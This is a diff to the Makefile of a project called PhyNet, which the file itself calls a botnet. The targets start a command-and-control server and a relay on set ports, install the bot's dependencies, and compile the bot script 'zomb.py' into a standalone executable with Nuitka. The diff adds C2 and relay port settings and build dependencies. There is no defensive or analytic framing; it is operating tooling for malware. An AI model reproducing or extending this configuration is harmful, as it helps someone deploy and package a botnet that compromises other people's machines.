@@ -1,6 +1,9 @@
 # default config:
 PY_EXE := py # may be python3 if you're on linux or on certain windows version
 
+CNC_PORT := 8080
+RELAY_PORT := 5000
+
 # nuitka config:
 NUITKA_EXE_NAME := phynet
 NUITKA_ARGS := -onefile --follow-imports --lto=no --remove-output --output-dir=bin/
@@ -13,7 +16,6 @@ else
 	PY_EXE += thon3
 endif
 
-
 # will install python modules for running the botnet locally (not for the relay)
 install:
 	@$(PY_EXE) -m pip install -r PhyNet/bot/requirements.txt
@@ -25,12 +27,12 @@ install-nuitka:
 
 # start the cnc
 cnc:
-	@$(PY_EXE) PhyNet/server/cnc/cnc.py
+	@$(PY_EXE) PhyNet/server/cnc/cnc.py $(CNC_PORT)
 
 # start the relay
 relay:
-	@$(PY_EXE) PhyNet/server/relay/relay.py
+	@$(PY_EXE) PhyNet/server/relay/relay.py $(RELAY_PORT)
 
 # build the bot
-build-bot:
+build-bot: | install install-nuitka
 	$(PY_EXE) -m nuitka PhyNet/bot/zomb.py $(NUITKA_ARGS)
